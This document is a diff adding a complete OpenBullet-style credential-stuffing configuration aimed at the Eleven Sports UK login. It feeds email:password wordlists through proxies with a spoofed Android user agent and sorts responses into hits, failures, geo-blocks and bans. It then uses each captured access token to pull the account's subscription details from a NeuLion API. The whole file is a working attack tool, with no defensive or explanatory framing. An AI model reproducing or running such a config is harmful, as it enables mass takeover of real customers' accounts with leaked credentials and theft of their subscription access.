@@ -1,0 +1,50 @@
+[SETTINGS]
+{
+  "Name": "Eleven Sports UK",
+  "SuggestedBots": 40,
+  "LastModified": "2018-08-28T01:14:30.6318643+00:00",
+  "AdditionalInfo": "",
+  "Author": "SubAtomic",
+  "Version": "1.0.0",
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+REQUEST POST "https://www.elevensports.uk/secure/authenticate" AutoRedirect=TRUE 
+  CONTENT "password=<PASS>&username=<USER>&accesstoken=true&format=json" 
+  CONTENTTYPE "application/x-www-form-urlencoded; charset=UTF-8" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Dalvik/1.6.0 (Linux; U; Android 4.4.2; SM-G955N Build/NRD90M) android mobile elevensports 8.0824" 
+  HEADER "Pragma: no-cache" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=FALSE 
+  KEYCHAIN Success OR 
+    KEY "loginsuccess" 
+  KEYCHAIN Failure OR 
+    KEY "<SOURCE>" DoesNotContain "loginsuccess" 
+  KEYCHAIN CUSTOM "FREE" OR 
+    KEY "failedgeo" 
+  KEYCHAIN Ban OR 
+    KEY "Access Denied" 
+#PARSE_TOKEN PARSE "<SOURCE>" LR "accessToken\":\"" "\"" Recursive=FALSE -> VAR "TOKEN" "" "" 
+#PARSE_LOCALE PARSE "<SOURCE>" LR "locale\":\"" "\"" Recursive=FALSE -> CAP "LOCALE" "" "" 
+REQUEST GET "https://mt3api.neulion.com/api_mt3/v1/account/subscriptions" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Dalvik/1.6.0 (Linux; U; Android 4.4.2; SM-G955N Build/NRD90M) android mobile elevensports 8.0824" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Authorization: Bearer <TOKEN>" 
+#SOURCE PARSE "<SOURCE>" LR "" "" Recursive=FALSE -> CAP "SOURCE" "" "" 
